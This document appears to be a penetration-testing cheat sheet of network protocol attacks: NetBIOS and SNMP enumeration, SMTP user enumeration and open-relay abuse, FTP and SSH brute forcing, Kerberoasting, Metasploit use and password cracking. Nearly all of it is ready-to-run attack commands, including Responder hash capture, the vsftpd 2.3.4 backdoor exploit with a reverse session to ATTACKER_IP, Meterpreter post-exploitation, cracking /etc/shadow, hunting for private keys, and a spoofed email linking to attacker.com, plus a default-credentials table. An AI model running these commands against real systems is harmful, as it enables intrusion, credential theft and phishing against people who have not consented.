---
icon: web-awesome
---

# Network Protocol Attacks

### NetBIOS Attacks

**NetBIOS** = Network Basic Input/Output System (ports 137, 138, 139)

```bash
# Enumerate NetBIOS names
nbtscan $ip
nbtscan $ip/24

# nmblookup
nmblookup -A $ip

# nmap
nmap -sV --script nbstat.nse -p 137 $ip

# Responder — capture NetBIOS/LLMNR hashes (MiTM)
responder -I eth0 -rdwv
# Captured hashes saved in /usr/share/responder/logs/
```

***

### SNMP Attacks

```bash
# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip

# Once community string found, walk the MIB tree
snmpwalk -v2c -c public $ip
snmpwalk -v2c -c private $ip

# Enumerate specific OIDs
snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.2  # running processes
snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.6.3.1.2  # installed software
snmpwalk -v2c -c public $ip 1.3.6.1.2.1.2.2.1.11     # network interfaces

# SNMP with metasploit
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS $ip
set COMMUNITY public
run
```

***

### SMTP Attacks

**SMTP** runs on port 25 (or 587 with STARTTLS, 465 with SSL)

```bash
# Banner grabbing
nc $ip 25
EHLO test

# User enumeration
smtp-user-enum -M VRFY -U users.txt -t $ip
smtp-user-enum -M EXPN -U users.txt -t $ip
smtp-user-enum -M RCPT -U users.txt -D domain.com -t $ip

# Metasploit enum
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS $ip
run

# Nmap SMTP scripts
nmap -p 25 --script smtp-commands $ip
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} $ip

# Open relay check (allows spam)
nmap -p 25 --script smtp-open-relay $ip

# Sending email via command line (if relay found)
swaks --to victim@target.com --from admin@target.com --server $ip --body "Click: http://attacker.com"
```

***

### FTP Attacks

**FTP** = File Transfer Protocol (plaintext, port 21)

```bash
# Anonymous login test
ftp $ip
# Username: anonymous
# Password: (blank or any email)

# With curl
curl -v ftp://$ip --user anonymous:

# Brute force credentials
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$ip
medusa -h $ip -u admin -P passwords.txt -M ftp

# Nmap scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-brute $ip

# Capture credentials by sniffing (Wireshark)
# FTP is plaintext — credentials visible in capture

# Exploit vulnerable FTP version
searchsploit vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor  # vsFTPd 2.3.4 backdoor
```

***

### SSH Attacks

```bash
# SSH banner grabbing
nc $ip 22

# Brute force SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$ip
hydra -L users.txt -P passwords.txt ssh://$ip -t 4

# Use private key to login
ssh -i id_rsa user@$ip

# Crack passphrase protected SSH key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Finding SSH private keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Locate SSH keys in NFS, SMB shares, history files
grep -r "PRIVATE KEY" / 2>/dev/null
```

***

### Kerberoasting

#### Overview

> Kerberoasting targets **service accounts** with SPNs (Service Principal Names). The attacker requests service tickets (TGS) which are encrypted with the service account password hash — then cracks them offline.

#### Steps

```
1. Enumerate Active Directory for accounts with SPNs
2. Request service tickets (TGS) for those SPNs
3. Extract ticket hashes
4. Crack hashes offline with hashcat/john
```

#### Commands

```bash
# Enumerate SPNs and request tickets (Linux — impacket)
GetUserSPNs.py domain.local/username:password -dc-ip $ip -request

# Save output to file
GetUserSPNs.py domain.local/username:password -dc-ip $ip -request -outputfile hashes.txt

# Windows (PowerShell)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN/hostname"

# With Invoke-Kerberoast (PowerSploit)
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat

# Crack the hash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

***

### Metasploit Overview

```bash
# Start
msfconsole

# Search for exploits
search type:exploit name:vsftpd
search cve:2021-34527

# Use a module
use exploit/unix/ftp/vsftpd_234_backdoor

# Set options
show options
set RHOSTS $ip
set LHOST ATTACKER_IP
set LPORT 4444

# Run
exploit
# or
run

# Session management
sessions -l          # list sessions
sessions -i 1        # interact with session 1
background           # background current session

# Post exploitation
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Meterpreter commands
sysinfo
getuid
getsystem           # attempt privilege escalation
upload file.exe C:\\temp\\
download C:\\file.txt
shell               # drop to system shell
```

***

### Password Cracking

#### Hashcat

```bash
# Identify hash type
hashid 'hash_value'
hash-identifier 'hash_value'

# Common hash modes
# -m 0    = MD5
# -m 100  = SHA1
# -m 1000 = NTLM
# -m 1800 = SHA-512 crypt (Linux)
# -m 3200 = bcrypt
# -m 13100 = Kerberos TGS-REP (Kerberoasting)
# -m 18200 = Kerberos AS-REP (ASREP Roasting)
# -m 5600 = NetNTLMv2 (Responder)

# Dictionary attack
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Rules-based attack
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (mask attack)
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d
# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special

# Combination attack
hashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt

# Show cracked passwords
hashcat -m 0 hash.txt --show
```

#### John The Ripper

```bash
# Auto-detect and crack
john hash.txt

# Specify wordlist
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Specify format
john hash.txt --format=NT --wordlist=wordlist.txt

# List cracked passwords
john hash.txt --show

# Crack /etc/shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack SSH key passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=wordlist.txt

# Crack zip file
zip2john archive.zip > zip.hash
john zip.hash --wordlist=wordlist.txt
```

#### Hydra (Online Brute Force)

```bash
# HTTP login form
hydra -l admin -P rockyou.txt $ip http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# SSH
hydra -l root -P rockyou.txt ssh://$ip

# FTP
hydra -l ftp -P rockyou.txt ftp://$ip

# RDP
hydra -l administrator -P rockyou.txt rdp://$ip

# SMB
hydra -l administrator -P rockyou.txt smb://$ip

# MySQL
hydra -l root -P rockyou.txt mysql://$ip

# Use username list
hydra -L users.txt -P rockyou.txt ssh://$ip
```

#### Password Policy Patterns

> Many organizations use predictable patterns:

* `CompanyName + Year` (e.g., HackTheBox2024)
* `Season + Year + !` (e.g., Winter2024!)
* `CompanyName + Numbers` (e.g., HTB01, HTB02)

#### Default Credentials

| Service | Default Username | Default Password    |
| ------- | ---------------- | ------------------- |
| Router  | admin            | admin / password    |
| MySQL   | root             | (blank)             |
| MSSQL   | sa               | (blank)             |
| Tomcat  | admin/tomcat     | admin/tomcat/s3cret |
| Jenkins | admin            | (varies)            |
| Grafana | admin            | admin               |
| MongoDB | (none)           | (none)              |
| CouchDB | admin            | admin               |

**Resources:**

* https://cirt.net/passwords
* https://default-password.info/
